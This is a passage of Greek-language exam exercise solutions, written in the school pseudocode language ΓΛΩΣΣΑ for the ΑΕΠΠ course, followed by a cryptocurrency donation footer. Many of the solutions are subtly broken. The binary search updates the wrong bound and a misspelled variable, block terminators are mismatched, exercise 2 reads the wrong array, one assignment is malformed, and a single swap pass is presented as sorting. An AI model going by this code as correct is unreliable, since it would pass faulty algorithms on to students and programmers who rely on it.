ΓΙΑ j ΑΠΟ 1 ΜΕΧΡΙ 6
ΣΒ[i] &amp;lt;- ΣΒ[i] + ΒΑΘ[i, j]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΣΥΝΑΡΤΗΣΗ ΑΣΚΗΣΗ11:(ΑΚΕΡΑΙΑ)
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:
ΛΟΓΙΚΕΣ:FOUND
ΑΡΧΗ
FOUND=ΨΕΥΔΗΣ
Ι=1
ΟΣΟ Ι&amp;lt;=1000 ΚΑΙ FOUND=ΨΕΥΔΗΣ ΕΠΑΝΕΛΑΒΕ:
ΑΝ ΣΤΟΙΧΕΙΟ==Α[Ι] ΤΟΤΕ:
!Επειδή στο Ι βρίσκεται η θέση αυτού που αναζητάμε μιας και είναι η μεταβλητή counter μας
ΑΣΚΗΣΗ11=Ι
!Το FOUND το χρησιμοποιούμε ώστε μόλις βρούμε το στοιχείο, να σταματήσουν οι επαναλήψεις
FOUND=ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ FOUND=ΨΕΥΔΗΣ ΤΟΤΕ:
ΑΣΚΗΣΗ11=0
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΔΙΚΑΣΙΑ ΑΣΚ12(Α,Ν)
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ: ΤΕΜΡ, Α[1000]
ΑΚΕΡΑΙΕΣ:Ι,Ν
ΑΡΧΗ
ΑΝ Ν&amp;gt;100 ΤΟΤΕ:
ΓΡΑΨΕ «ΔΕΝ ΜΠΟΡΕΙ ΤΟ ΠΛΗΘΟΣ ΤΩΝ ΣΤΟΙΧΕΙΩΝ ΝΑ ΕΊΝΑΙ ΜΕΓΑΛΥΤΕΡΟ ΑΠΌ 100»
ΑΛΛΙΩΣ :
ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ Ν
ΑΝ Α[Ι]&amp;lt;Α[Ι-1] ΤΟΤΕ:
ΤΕΜΡ = Α[Ι]
Α[Ι]=Α[Ι-1]
Α[Ι-1]= ΤΕΜΡ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΠΑΝΕΛΕ2015
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: Α, Β
ΠΡΑΓΜΑΤΙΚΕΣ: ΧΩΡΟΣΑ, ΧΩΡΟΣΒ, ΔΕΜΑ
ΑΡΧΗ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΧΩΡΟΣΑ
ΜΕΧΡΙΣ_ΟΤΟΥ ΧΩΡΟΣΑ &amp;gt; 0
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΧΩΡΟΣΒ
ΜΕΧΡΙΣ_ΟΤΟΥ ΧΩΡΟΣΒ &amp;gt; 0
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΔΕΜΑ
ΜΕΧΡΙΣ_ΟΤΟΥ ΔΕΜΑ &amp;gt;= 0
Α &amp;lt;- 0
Β &amp;lt;- 0
ΟΣΟ ΔΕΜΑ &amp;lt;&amp;gt; 0 ΕΠΑΝΑΛΑΒΕ
ΑΝ ΧΩΡΟΣΑ &amp;gt;= ΧΩΡΟΣΒ ΚΑΙ ΔΕΜΑ &amp;lt;= ΧΩΡΟΣΑ ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Α&amp;#39;
ΧΩΡΟΣΑ &amp;lt;- ΧΩΡΟΣΑ - ΔΕΜΑ
Α &amp;lt;- Α + 1
ΑΛΛΙΩΣ_ΑΝ ΔΕΜΑ &amp;lt;= ΧΩΡΟΣΒ ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Β&amp;#39;
ΧΩΡΟΣΒ &amp;lt;- ΧΩΡΟΣΒ - ΔΕΜΑ
Β &amp;lt;- Β + 1
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#39;Προώθηση&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΔΕΜΑ
ΜΕΧΡΙΣ_ΟΤΟΥ ΔΕΜΑ &amp;gt;= 0
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΚΑΛΕΣΕ ΕΥΡΕΣΗ(Α, Β)
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΔΙΑΔΙΚΑΣΙΑ ΕΥΡΕΣΗ(Α, Β)
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: Α, Β
ΑΡΧΗ
ΑΝ Α = 0 ΚΑΙ Β = 0 ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Καμία αποθήκευση στο αεροδρόμιο&amp;#39;
ΑΛΛΙΩΣ
ΑΝ Α = Β ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Ισάριθμα&amp;#39;
ΑΛΛΙΩΣ_ΑΝ Α &amp;gt; Β ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Α&amp;#39;
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#39;Β&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΔΙΑΔΙΚΑΣΙΑΣ
&lt;/code>&lt;/pre>&lt;p>To συγκεκριμένο θέμα είναι από Διαγώνισμα από το Στέκι των Πληροφορικών!!!&lt;/p>
&lt;p>Εκεί μπορείτε να βρείτε κι άλλα διαγωνίσματα στο ΑΕΠΠ.&lt;/p>
&lt;p>Link: &lt;a href="https://alkisg.mysch.gr/steki/index.php?topic=7123.0">https://alkisg.mysch.gr/steki/index.php?topic=7123.0&lt;/a>&lt;/p>
&lt;hr>
&lt;h2 id="υποστηρίξτε-το-project-για-να-συνεχίσουμε-να-παράγουμε-εκπαιδευτικό-υλικό">Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό.&lt;/h2>
&lt;p>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="https://www.youtube.com/LinuxOSblog/">στο κανάλι στο Youtube&lt;/a> καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p></content></item><item><title>Θέματα Γ+Δ Part2</title><link>/lyseis_aepp/content/posts/ask_g+d_2/</link><pubDate>Mon, 28 Feb 2022 00:00:00 +0000</pubDate><guid>/lyseis_aepp/content/posts/ask_g+d_2/</guid><description>Άσκηση 1: ΠΡΟΓΡΑΜΜΑ ΑΣΚ01 ΜΕΤΑΒΛΗΤΕΣ: ΑΚΕΡΑΙΕΣ : i , x ΠΡΑΓΜΑΤΙΚΕΣ: ΘΕΡΜΟΚΡΑΣΙΑ[20] ,ΜΑΧ ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[20] ΑΡΧΗ: ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 20 ΔΙΑΒΑΣΕ ΟΝΟΜΑ[i] ,ΘΕΡΜΟΚΡΑΣΙΑ[i] TEΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ ΜΑΧ=-9999 !Γιατί η υψηλότερη μπορεί να είναι και -40 - δεν το ξέρουμε ) χ&amp;lt;- 0 ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 20 ΑΝ ΘΕΡΜΟΚΡΑΣΙΑ[i] &amp;gt; ΜΑΧ ΤΟΤΕ ΜΑΧ&amp;lt;- ΘΕΡΜΟΚΡΑΣΙΑ[i] χ&amp;lt;- i ΤΕΛΟΣ_ΑΝ ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ ΓΡΑΨΕ ΟΝΟΜΑ[x] ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ Άσκηση 2: ΠΡΟΓΡΑΜΜΑ ΑΣΚ102: ΜΕΤΑΒΛΗΤΕΣ: ΑΚΕΡΑΙΕΣ: Ι ,ΣΥΝΟΝΟΛΟΟΧΙ ,ΣΥΝΟΛΟΝΑΙ ,COUNTER ΠΡΑΓΜΑΤΙΚΕΣ: ΜΟ1 ,ΜΟ2 ,ΓΕΝΙΚΟΣΜΟ ΧΑΡΑΚΤΗΡΕΣ : ΟΝΟΜΑ1[650] .</description><content>&lt;h2 id="άσκηση-1">Άσκηση 1:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ01
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ : i , x
ΠΡΑΓΜΑΤΙΚΕΣ: ΘΕΡΜΟΚΡΑΣΙΑ[20] ,ΜΑΧ
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[20]
ΑΡΧΗ:
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 20
ΔΙΑΒΑΣΕ ΟΝΟΜΑ[i] ,ΘΕΡΜΟΚΡΑΣΙΑ[i]
TEΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΜΑΧ=-9999 !Γιατί η υψηλότερη μπορεί να είναι και -40 - δεν το ξέρουμε )
χ&amp;lt;- 0
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 20
ΑΝ ΘΕΡΜΟΚΡΑΣΙΑ[i] &amp;gt; ΜΑΧ ΤΟΤΕ
ΜΑΧ&amp;lt;- ΘΕΡΜΟΚΡΑΣΙΑ[i]
χ&amp;lt;- i
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ ΟΝΟΜΑ[x]
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-2">Άσκηση 2:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ102:
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι ,ΣΥΝΟΝΟΛΟΟΧΙ ,ΣΥΝΟΛΟΝΑΙ ,COUNTER
ΠΡΑΓΜΑΤΙΚΕΣ: ΜΟ1 ,ΜΟ2 ,ΓΕΝΙΚΟΣΜΟ
ΧΑΡΑΚΤΗΡΕΣ : ΟΝΟΜΑ1[650] . ΟΝΟΜΑ2[480] ,ΑΠΑ1[650] ,ΑΠΑ2[480]
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 650
ΔΙΑΒΑΣΕ ΟΝΟΜΑ1[Ι],ΗΛΙΚΙΑ1[Ι]
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΑΠΑ1[Ι]
ΜΕΧΡΙΣ_ΟΤΟΥ ΑΠΑ1[Ι]=&amp;#34;ΝΑΙ&amp;#34; Η ΑΠΑ1[Ι]=&amp;#34;ΟΧΙ&amp;#34;
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 480
ΔΙΑΒΑΣΕ ΟΝΟΜΑ2[Ι],ΗΛΙΚΙΑ2[Ι]
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΑΠΑ1[Ι]
ΜΕΧΡΙΣ_ΟΤΟΥ ΑΠΑ2[Ι]=&amp;#34;ΝΑΙ&amp;#34; Η ΑΠΑ2[Ι]=&amp;#34;ΟΧΙ&amp;#34;
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΣΥΝΟΛΟΝΑΙ=0
ΣΥΝΟΛΟΟΧΙ=0
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 650
ΑΝ ΑΠΑ1[Ι]=&amp;#34;ΝΑΙ&amp;#34; ΤΟΤΕ
ΣΥΝΟΛΟΝΑΙ= ΣΥΝΟΛΟΝΑΙ +1
ΑΛΛΙΩΣ
ΣΥΝΟΛΟΟΧΙ= ΣΥΝΟΛΟΟΧΙ +1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 480
ΑΝ ΑΠΑ1[Ι]=&amp;#34;ΝΑΙ&amp;#34; ΤΟΤΕ
ΣΥΝΟΛΟΝΑΙ= ΣΥΝΟΛΟΝΑΙ +1
ΑΛΛΙΩΣ
ΣΥΝΟΛΟΟΧΙ= ΣΥΝΟΛΟΟΧΙ +1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΣΥΝΟΛΟΝΑΙ&amp;gt;ΣΥΝΟΛΟΟΧΙ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΟΙ ΚΑΤΟΙΚΟΙ ΘΕΛΟΥΝ ΤΟ ΕΡΓΟΣΤΑΣΙΟ&amp;#34;
ΑΛΛΙΩΣ_ ΑΝ ΣΥΝΟΛΟΝΑΙ&amp;lt;ΣΥΝΟΛΟΟΧΙ ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;ΟΙ ΚΑΤΟΙΚΟΙ ΔΕΝ ΘΕΛΟΥΝ ΤΟ ΕΡΓΟΣΤΑΣΙΟ&amp;#34;
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;ΙΣΟΠΑΛΙΑ&amp;#34;
ΜΟ1=0
ΜΟ2=0
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 650
ΜΟ1= ΜΟ1 + ΗΛΙΚΙΑ1[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 480
ΜΟ2= ΜΟ2 + ΗΛΙΚΙΑ2[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΕΝΙΚΟΣΜΟ= (ΜΟ1+ΜΟ2)/(650+480)
ΜΟ1= ΜΟ1/650
ΜΟ2= ΜΟ2/480
ΓΡΑΨΕ ΜΟ1,ΜΟ2,ΓΕΝΙΚΟΣΜΟ
COUNTER=0
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 650
ΑΝ ΗΛΙΚΙΑ1[Ι] &amp;gt; ΓΕΝΙΚΟΣΜΟ ΤΟΤΕ
COUNTER= COUNTER +1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 480
ΑΝ ΗΛΙΚΙΑ2[Ι] &amp;gt; ΓΕΝΙΚΟΣΜΟ ΤΟΤΕ
COUNTER= COUNTER +1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ COUNTER
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-3">Άσκηση 3:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ103
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ : Ι , Ν
ΠΡΑΓΜΑΤΙΚΕΣ: Β[150] ,SWAP
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[150] ,SWAP1
ΑΡΧΗ:
ΓΙΑ Ι ΑΠΟ 2 ΜΕΧΡΙ 150 ! Αλγόριθμος Ταξινόμησης
ΓΙΑ Ν ΑΠΟ 150 ΜΕΧΡΙ Ι ΜΕ_ΒΗΜΑ -1
ΑΝ Β[Ν]&amp;gt;Β[Ν-1] ΤΟΤΕ
SWAP = Β[Ν]
! Μεταβλητή που συγκρατεί την τίμη της μίας μεταβλητής για να αντιμεταθέσουμε
τις τίμες (Διαφορετικά θα χάναμε την μία τιμή)
B[N] = [B[N-1]
B[N-1] = SWAP
SWAP1 = ONOMA[Ν]
ONOMA[N] = ONOMA[N-1]
ONOMA[N-1] = SWAP1
TEΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 150
ΓΡΑΨΕ ΟΝΟΜ[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-4">Άσκηση 4:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ104
​ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ : ΜΟ
ΑΚΕΡΑΙΕΣ : Ι ,ΑΝΤΙΤΥΠΟ[Ν] , ΦΟΡΕΣ[Ν] ,Κ ,ΛΙΓ ,ΚΑΘΟΛΟΥ ,ΑΝΤΙΤΥΠΟ
ΧΑΡΑΚΤΗΡΕΣ : ΟΝΟΜΑΒΙΒΛΙΟΥ[Ν] ,ΑΠ
ΑΡΧΗ
Ι=0
ΚΑΘΟΛΟΥ=0
ΑΝΤΙΤΥΠΑ=0
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#34; ΕΧΕΙΣ ΚΙ ΑΛΛΟ ΒΙΒΛΙΟ; &amp;#34;
ΔΙΑΒΑΣΕ ΑΠ
ΜΕΧΡΙΣ_ΟΤΟΥ (ΑΠ=&amp;#34;ΝΑΙ&amp;#34; Η ΑΠ=&amp;#34;ΟΧΙ)
ΑΝ (ΑΠ=&amp;#34;ΝΑΙ&amp;#34;)
Ι &amp;lt;- Ι+1 !Για να μετρήσουμε πόσα βιβλία υπάρχουν μέσα στην βιβλιοθήκη ,μιας και μπορούν να μας δοθούν απο 0 μέχρι Ν βιβλία!
ΔΙΑΒΑΣΕ ΟΝΟΜΑΒΙΒΛΙΟΥ[Ι] ,ΑΝΤΙΤΥΠΟ[Ι] , ΦΟΡΕΣ[Ι]
ΑΝΤΙΤΥΠΑ= ΑΝΤΙΤΥΠΑ + ΑΝΤΙΤΥΠΟ[Ι]
ΑΝ ΦΟΡΕΣ[Ι]=0 ΤΟΤΕ
ΚΑΘΟΛΟΥ = ΚΑΘΟΛΟΥ + 1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ (Ι=Ν Ή ΑΠ=&amp;#34;ΟΧΙ&amp;#34; )
ΜΟ=ΑΝΤΙΤΥΠΑ/Ι
ΓΡΑΨΕ Ι , ΜΟ ,ΚΑΘΟΛΟΥ
ΓΙΑ Κ ΑΠΟ 1 ΜΕΧΡΙ Ι
ΑΝ ( ΜΟ&amp;gt;ΑΝΤΙΤΥΠΟ[Ι] ΚΑΙ ΦΟΡΕΣ[Ι] &amp;gt;10 ) ΤΟΤΕ
ΛΙΓ = ΛΙΓ+1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ ΛΙΓ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-5">Άσκηση 5:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ105
​ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ : ΒΑΘΜ[12] , ΜΑΧ
ΑΚΕΡΑΙΕΣ : ΗΛΙΚΙΑ[12] , Ζ ,Ι ,Σ ,ΜΙΝ
ΧΑΡΑΚΤΗΡΕΣ : ΟΝΟΜΑ[12]
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 12
ΔΙΑΒΑΣΕ ΗΛΙΚΙΑ[Ι] ,ΟΝΟΜΑ[Ι] ,ΒΑΘΜ[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΜΑΧ = ΒΑΘΜ[1]
Ζ=1
ΓΙΑ Ι ΑΠΟ 2 ΜΕΧΡΙ 12 ! Το 1 έχει ηδη χρησιμοποιηθει ως μαξ ,γι αυτο δεν χρειάζεται αυτή η επανάληψη
ΑΝ ΜΑΧ&amp;lt;ΒΑΘΜ[Ι] ΤΟΤΕ
ΜΑΧ=ΒΑΘΜ[Ι]
Ζ=Ι
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ ΟΝΟΜΑ[Ζ] , ΗΛΙΚΙΑ[Ζ]
ΜΙΝ= ΗΛΙΚΙΑ[1]
Σ=1
ΓΙΑ Ι ΑΠΟ 2 ΜΕΧΡΙ 12
ΑΝ ΜΙΝ&amp;lt;ΗΛΙΚΙΑ[Ι] ΤΟΤΕ
ΜΙΝ = ΗΛΙΚΙΑ[Ι]
Σ=Ι
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ Ζ=Σ ΤΟΤΕ
ΓΡΑΨΕ&amp;#34; O μικρότερος σε ηλικία είχε την μεγαλύτερη βαθμολογία &amp;#34; , ΜΙΝ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-6">Άσκηση 6:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ106
​ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ : Π[100], Χ[100], ΜΑΧ
ΑΚΕΡΑΙΕΣ : Ι
ΧΑΡΑΚΤΗΡΕΣ : ΠΡΟΜΗΘΕΥΤΗΣ
ΛΟΓΙΚΕΣ : ΒΡΕΘΗΚΕ
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 100 !ΓΕΜΙΣΜΑ ΠΙΝΑΚΩΝ
ΔΙΑΒΑΣΕ Π[Ι], Χ[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΜΑΧ&amp;lt;- 0 !ΕΥΡΕΣΗ ΤΟΥ ΜΕΓΙΣΤΟΥ ΧΡΕΟΥΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 100
ΑΝ Χ[Ι]&amp;gt;ΜΑΧ ΤΟΤΕ
ΜΑΧ&amp;lt;-Χ[Ι]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
!ΣΑΡΩΣΗ ΠΙΝΑΚΑ ΧΡΕΩΝ ΚΑΙ ΕΛΕΧΓΟΣ ΓΙΑ ΚΑΘΕ ΘΕΣΗ ΑΝ ΕΙΝΑΙ ΙΣΟ ΜΕ ΜΑΧ
​ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 100 !ΚΑΙ ΕΜΦΑΝΙΣΗ ΠΡΟΜΗΘΕΥΤΗ
ΑΝ Χ[Ι]=ΜΑΧ ΤΟΤΕ
ΓΡΑΨΕ Π[Ι]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΠΡΟΜΗΘΕΥΤΗΣ !ΑΝΑΖΗΤΗΣΗ ΠΡΟΜΗΘΕΥΤΗ ΣΤΟΝ Π[100]
ΒΡΕΘΗΚΕ &amp;lt;- ΨΕΥΔΗΣ ! Η ΣΕΙΡΙΑΚΗ ΑΝΑΖΗΤΗΣΗ ΣΤΑΜΑΤΑ ΜΟΛΙΣ ΒΡΕΘΕΙ Ο ΠΡΟΜΗΘΕΥΤΗΣ ΜΕ ΤΗ ΒΟΗΘΕΙΑ ΤΗΣ ΒΡΕΘΗΚΕ
Ι&amp;lt;- 1
ΟΣΟ Ι &amp;lt;=100 ΚΑΙ ΒΡΕΘΗΚΕ = ΨΕΥΔΗΣ ΕΠΑΝΑΛΑΒΕ
ΑΝ Π[Ι] = ΠΡΟΜΗΘΕΥΤΗΣ ΤΟΤΕ
ΓΡΑΨΕ Π[Ι]
ΒΡΕΘΗΚΕ &amp;lt;- ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
Ι&amp;lt;- Ι +1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΒΡΕΘΗΚΕ = ΨΕΥΔΗΣ ΤΟΤΕ !ΕΜΦΑΝΙΣΗ ΜΗΝΥΜΑΤΟΣ ΣΕ ΠΕΡΙΠΤΩΣΗ ΑΠΟΤΥΧΗΜΕΝΗΣ ΑΝΑΖΗΤΗΣΗΣ
ΓΡΑΨΕ &amp;#39;Ο ΠΡΟΜΗΘΕΤΗΣ ΠΟΥ ΔΩΣΑΤΕ ΔΕΝ ΥΠΑΡΧΕΙ ΣΤΟΝ ΠΙΝΑΚΑ ΠΡΟΜΗΘΕΤΩΝ&amp;#39;
ΤΕΛΟΣ_ΑΝ
​ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-7">Άσκηση 7:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ 107
​ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: αρ,δεξ,μεσ,Α[300],ΑΡΙΘΜΟΣ
ΛΟΓΙΚΕΣ: βρ
ΑΡΧΗ
αρ &amp;lt;- 1
δεξ &amp;lt;- 300
βρ &amp;lt;-ΨΕΥΔΗΣ
θ &amp;lt;- 0
ΔΙΑΒΑΣΕ ΑΡΙΘΜΟΣ
ΟΣΟ αρ &amp;lt;= δεξ ΚΑΙ βρ=ΨΕΥΔΗΣ ΕΠΑΝΑΛΑΒΕ
μεσ &amp;lt;- (αρ + δεξ) DIV 2 ! Αλγόριθμος Δυαδικής αναζήτησης
ΑΝ Α[μεσ]&amp;lt; ΑΡΙΘΜΟΣ ΤΟΤΕ
δε&amp;lt;- μεσ - 1
ΑΛΛΙΩΣ_ΑΝ Α[μεσ] &amp;gt; ΑΡΙΘΜΟΣ ΤΟΤΕ
αρ&amp;lt;- μεσ+1
ΑΛΛΙΩΣ
βρ &amp;lt;- ΑΛΗΘΗΣ
θ&amp;lt;-μεσ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ βρ=ΑΛΗΘΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Ο ΑΡΙΘΜΟΣ &amp;#39;,ΑΡΙΘΜΟΣ, &amp;#39; ΒΡΕΘΗΚΕ ΣΤΗΝ ΘΕΣΗ: &amp;#39; ,θ
ΑΛΛΙΩΣ
ΓΡΑΨΕ ΄Ο ΑΡΙΘΜΟΣ &amp;#39;,ΑΡΙΘΜΟΣ, &amp;#39; ΔΕΝ ΥΠΑΡΧΕΙ&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
